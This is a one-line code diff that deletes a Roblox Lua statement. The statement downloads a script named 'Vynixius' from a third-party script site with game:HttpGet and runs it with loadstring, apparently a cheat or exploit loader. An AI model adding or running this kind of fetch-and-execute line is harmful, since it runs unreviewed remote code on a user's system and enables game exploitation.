@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://robloxscripts.co.uk/request-script/Vynixius-140'))()
